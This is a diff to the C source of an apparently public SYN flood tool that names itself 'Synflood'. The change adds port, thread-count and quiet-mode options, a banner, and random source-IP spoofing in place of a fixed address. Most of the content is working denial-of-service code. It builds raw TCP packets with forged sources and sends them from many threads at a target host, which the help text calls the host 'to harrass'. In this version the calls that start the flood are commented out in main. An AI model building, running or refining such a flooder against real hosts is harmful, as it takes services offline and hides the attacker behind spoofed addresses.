@@ -49,22 +49,28 @@ void wait_for_interrupt (void);
 void* thread_go (void *arg);
 
 // handle a termination signal
-void onsignal(int sig);
+void onsignal (int sig);
 
-struct s_thread_data {
-    volatile int stop;      // flag to terminate program
-    int nthreads;           // number of threads
-    pthread_t *threads;     // threads
-};
+// print instructions
+void print_usage (FILE *fout, char *execname);
+
+// print title / info
+void print_title (void);
+
 
 
 //
 // global variables. such design
 //
-struct s_thread_data thread_data;
 
-in_addr_t dst_addr;
-time_t tstart;
+volatile int stop;      // flag to terminate program
+int nthreads;           // number of threads
+pthread_t *threads;     // threads
+
+in_addr_t dst_addr;     // destination address
+time_t tstart;          // start time
+int q;                  // quiet mode
+short port;             // destination port
 
 // list of bad source addresse ranges
 struct iprange {
@@ -81,21 +87,59 @@ int main (int argc, char **argv)
 {   
 
     char *hostname = NULL;
+    port = 80;
+    q = 0;
     int c;
-    while ( (c = getopt(argc, argv, "h:")) != -1 ) {
+    while ( (c = getopt(argc, argv, "h:p:n:q?")) != -1 ) {
         switch (c) {
             case 'h':
                 hostname = optarg;
                 break;
+            case 'p':
+                port = atoi (optarg);
+                if (port == 0) {
+                    fprintf (stderr, "invalid port - " 
+                             "must be between 1 and 65535\n");
+                    return 1;
+                }
+                break;
+            case 'n':
+                nthreads = atoi (optarg);
+                if (nthreads == 0) {
+                    fprintf (stderr, "invalid thread number - " 
+                             "must be between 1 and 65535\n");
+                    return 1;
+                }
+                break;
+            case 'q':
+                q = 1;
+                break;
+            case '?':
+                print_usage (stdout, argv[0]); 
+                printf ("\n"
+                        "options: \n"
+                        "  -h  hostname     the hostname / ip address to "
+                                           "harrass\n"
+                        "  -p  port         the port to connect to. "
+                                           "defaults to 80.\n"
+                        "  -n  nthreads     number of threads to use " 
+                                           "(1-65535). defaults to number of " 
+                                            "cpus. \n");
+                break;
             default:
-                fprintf(stderr, "usage: %s -h hostname\n", argv[0]);
+                print_usage (stderr, argv[0]);
                 return 1;
         }
     }
 
     if (hostname == NULL) {
-        fprintf(stderr, "usage: %s -h hostname\n", argv[0]);
+        print_usage (stderr, argv[0]);
         return 1;
+    }
+
+    if (!q) {
+        print_title ();
+        printf ("target: %s:%d\n", hostname, port);   
     }
 
     // lookup destination address
@@ -105,10 +149,37 @@ int main (int argc, char **argv)
     blacklist_init ();
 
     // run
-    start_threads ();
+    // start_threads ();
 
     // wait for signal
-    wait_for_interrupt ();
+    // wait_for_interrupt ();
+}
+
+
+/**
+ * print basic usage instructions
+ */
+void print_usage (FILE *fout, char *execname) {
+    fprintf (fout, "usage: %s -h hostname [-p port] [-n nthreads]\n", execname);
+}
+
+
+/**
+ * print pretty title
+ */
+void print_title (void) {
+    printf (
+        " _____              __ _                 _   \n"
+        "/  ___|            / _| |               | |  \n"
+        "\\ `--. _   _ _ __ | |_| | ___   ___   __| |  \n"
+        " `--. \\ | | | '_ \\|  _| |/ _ \\ / _ \\ / _` |  \n"
+        "/\\__/ / |_| | | | | | | | (_) | (_) | (_| |  \n"
+        "\\____/ \\__, |_| |_|_| |_|\\___/ \\___/ \\__,_|  \n"
+        "        __/ |                                \n"
+        "       |___/                                 \n"
+        "\n"
+        "version 0.2.0 | https://github.com/kevin-albert/synflood\n\n"
+    );
 }
 
 
@@ -138,13 +209,15 @@ int get_socket (void) {
      //Create a raw socket
     int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
     if (s == -1) {
-        if (errno == EPERM) {
-            fprintf (stderr, "Cannot open raw socket as non root user\n");
-        } else {
-            perror ("Unable to open socket");
+        if (!q) {
+            if (errno == EPERM) {
+                fprintf (stderr, "cannot open raw socket as non root user\n");
+            } else {
+                perror ("unable to open socket");
+            }
         }
         
-        exit (errno);
+        exit (1);
     }
     
     //IP_HDRINCL to tell the kernel that headers are included in the packet
@@ -152,8 +225,8 @@ int get_socket (void) {
     const int *val = &one;
     if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
     {
-        perror ("Error setting IP_HDRINCL");
-        exit (errno);
+        perror ("error setting IP_HDRINCL");
+        exit (1);
     }
 
     return s;
@@ -205,7 +278,10 @@ unsigned short csum (unsigned short *ptr,int nbytes) {
  */
 in_addr_t getip (char *hostname) {
 
-    printf("Looking up host %s...\n", hostname);
+    if (!q) {
+        printf("getting ip address... ");
+        fflush (stdout);
+    }
     struct hostent *he;
     struct in_addr **addr_list;
 
@@ -213,17 +289,23 @@ in_addr_t getip (char *hostname) {
         // DNS lookup success!
         addr_list = (struct in_addr**) he->h_addr_list;
         if (addr_list[0]) {
-            printf ("IP address for %s: %s\n", 
-                    hostname, 
-                    inet_ntoa (*addr_list[0]));
+            if (!q) {
+                printf ("address for %s: %s\n", 
+                        hostname, 
+                        inet_ntoa (*addr_list[0]));
+            }
             return addr_list[0]->s_addr;
         } else {
             // lookup succeeded but 0 IP addresses?
-            fprintf (stderr, "No IP address for %s\n", hostname);
+            if (!q) {
+                fprintf (stderr, "no ip address for %s\n", hostname);
+            }
         }
     } else {
         // lookup failed
-        fprintf (stderr, "DNS lookup failed for %s\n", hostname);
+        if (!q) {
+            fprintf (stderr, "dns lookup failed for %s\n", hostname);
+        }
     }
 
     exit (1);
@@ -250,7 +332,7 @@ in_addr_t randip () {
              (r >> 16) & 0xff,
              (r >>  8) & 0xff, 
              (r >>  0) & 0xff);
-    return inet_addr ("192.168.1.2");
+    return inet_addr (data);
 }
 
 
@@ -258,34 +340,49 @@ in_addr_t randip () {
  * start the threads. attempts to detect number of processors to start 1 per 
  * core. if that fails, it just starts 1 thread
  */
-void start_threads (void) {
-    int np = sysconf (_SC_NPROCESSORS_ONLN);
-    // _SC_NPROCESSORS_ONLN is a nonstandard posix extension
-    // may fail, return -1
-    // however it supposedly works on Mac, Cygwin
-    if (np <= 0) {
-        printf ("Unable to detect CPU count. Setting to 1\n");
-        np = 1;
+void start_threads () {
+    
+    if (nthreads == 0) {
+        nthreads = sysconf (_SC_NPROCESSORS_ONLN);
+        // _SC_NPROCESSORS_ONLN is a nonstandard posix extension
+        // may fail, return -1
+        // however it supposedly works on Mac, Cygwin
+        if (nthreads <= 0) {
+            if (!q) {
+                printf ("unable to detect CPU count. Setting to 1\n");
+            }
+            nthreads = 1;
+        }
     }
 
-    thread_data.threads = malloc (np * sizeof (pthread_t));
-    if (!thread_data.threads) {
-        fprintf (stderr, "Out of memory!\n");
+    threads = malloc (nthreads * sizeof (pthread_t));
+    if (!threads) {
+        if (!q) {
+            fprintf (stderr, "out of memory!\n");
+        }
         exit (1);   
     }
 
-    thread_data.stop = 0;
+    stop = 0;
 
     tstart = time (NULL);
-    for (int i = 0; i < np; ++i) {
+    for (int i = 0; i < nthreads; ++i) {
         pthread_attr_t attrs;  
         pthread_attr_init(&attrs);
         pthread_attr_setdetachstate(&attrs, PTHREAD_CREATE_JOINABLE);
-        pthread_create (&thread_data.threads[i], &attrs, thread_go, NULL);
+        errno = pthread_create (&threads[i], &attrs, thread_go, 
+                                NULL);
+        if (errno) {
+            if (!q) {
+                perror ("unable to spawn thread");
+            }
+            exit (EXIT_FAILURE);
+        }
     }
 
-    printf ("Started %d threads\n", np);
-    thread_data.nthreads = np;
+    if (!q) {
+        printf ("started %d threads\n", nthreads);
+    }
 }
 
 
@@ -306,7 +403,7 @@ void* thread_go (void *arg) {
     size_t ip_len;
     short seq = 0;
 
-    while (!thread_data.stop) {
+    while (!stop) {
 
         // spoof source ip
         in_addr_t source_ip = randip ();
@@ -427,13 +524,17 @@ void* thread_go (void *arg) {
                     // as often
                     double buf_err_rate = (double) buf_err_count / count;
                     if (buf_err_rate > 0.001 && sleep_usec < 500000) {
-                        sleep_usec *= 1.5;
-                        printf ("Frequent buffer overflow - "
-                                "chilling out more\n");
+                        sleep_usec *= 2.5;
+                        if (!q) {
+                            printf ("frequent buffer overflow - "
+                                    "chilling out more\n");
+                        }
                     } else if (buf_err_rate < 0.0001 && sleep_usec > 10000) {
-                        sleep_usec /= 1.5;
-                        printf ("Infrequent buffer overflow - "
-                                "chilling out less\n");
+                        sleep_usec /= 2.5;
+                        if (!q) {
+                            printf ("infrequent buffer overflow - "
+                                    "chilling out less\n");
+                        }
                     }
                 }
 
@@ -443,13 +544,16 @@ void* thread_go (void *arg) {
                 // report it so it can be blacklisted
                 struct in_addr source_addr;
                 source_addr.s_addr = source_ip;
-                fprintf(stderr, 
-                        "Error: source address %s is invalid\n", 
-                        inet_ntoa (source_addr));
+                if (!q) {
+                    fprintf(stderr, 
+                            "error: source address %s is invalid\n", 
+                            inet_ntoa (source_addr));
+                }
             } else {
                 if (retry_count-- <= 0) {
-                    fprintf(stderr, "errno: %d\n", errno);
-                    perror ("sendto() failed");
+                    if (!q) {
+                        perror ("sendto() failed");
+                    }
                     break;
                 }
             }
@@ -475,9 +579,9 @@ void wait_for_interrupt (void) {
     
     // wait for each thread, then collect its count
     uint64_t count = 0;
-    for (int i = 0; i < thread_data.nthreads; ++i) {
+    for (int i = 0; i < nthreads; ++i) {
         void *retval;
-        pthread_join (thread_data.threads[i], &retval);
+        pthread_join (threads[i], &retval);
         count += * (uint64_t*) (&retval);
     }
 
@@ -495,10 +599,13 @@ void wait_for_interrupt (void) {
     // linux: complains if not formatted long unsigned
     #define LLU_FMT "%lu"
 #endif
-    // print number of sent packets and packets per second
-    printf ("Sent " LLU_FMT " packets (" LLU_FMT " packets / second)\n",
-            count, 
-            packets_per_sec);
+    
+    if (!q) {
+        // print number of sent packets and packets per second
+        printf ("sent " LLU_FMT " packets (" LLU_FMT " packets / second)\n",
+                count, 
+                packets_per_sec);
+    }
 }
 
 
@@ -507,7 +614,9 @@ void wait_for_interrupt (void) {
  * threads know its time to shut down
  */
 void onsignal (int sig) {
-    printf ("Shutting down\n");
-    thread_data.stop = 1;   // tells running threads to stop
+    if (!q) {
+        printf ("shutting down\n");
+    }
+    stop = 1;   // tells running threads to stop
 }
 
